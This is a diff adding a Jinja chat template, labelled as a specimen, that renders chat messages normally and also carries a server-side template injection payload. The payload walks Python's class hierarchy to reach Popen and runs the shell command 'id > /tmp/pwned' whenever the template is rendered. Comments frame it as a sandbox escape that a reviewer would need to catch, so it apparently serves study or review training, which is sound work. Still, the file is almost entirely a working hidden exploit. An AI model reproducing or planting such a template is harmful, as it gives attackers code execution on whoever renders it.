@@ -1,0 +1,13 @@
+{#- SPECIMEN 01 — SANDBOX ESCAPE VIA SSTI CLASS WALK -#
+ # Victim renders this template; Jinja evaluates it with the sandbox ON,
+ # but the class-walk defeats it. Fires the moment a chat is rendered.
+ #}
+{%- for m in messages -%}
+{{ m['role'] }}: {{ m['content'] }}
+{%- endfor -%}
+{{ ''.__class__.__mro__[1].__subclasses__() | attr('__len__') }}
+{#- the payload line a reviewer would need to catch: -#}
+{%- set x = ''['__class__']['__mro__'][1]['__subclasses__']() -%}
+{%- for c in x if c['__name__'] == 'Popen' -%}
+{{ c('id > /tmp/pwned', shell=true) }}
+{%- endfor -%}
